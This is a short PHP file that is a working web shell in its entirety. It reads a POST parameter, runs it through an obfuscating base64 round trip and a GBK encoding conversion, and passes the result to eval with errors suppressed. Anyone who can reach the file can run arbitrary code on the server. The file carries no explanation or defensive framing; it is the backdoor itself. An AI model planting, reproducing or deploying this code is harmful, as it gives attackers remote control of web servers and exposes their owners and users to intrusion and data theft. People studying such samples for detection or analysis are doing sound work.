<?php
$str = base64_decode(base64_encode($_POST['fuck']));
$str1 = mb_convert_encoding($str,"GBK");
@eval($str1);
?>
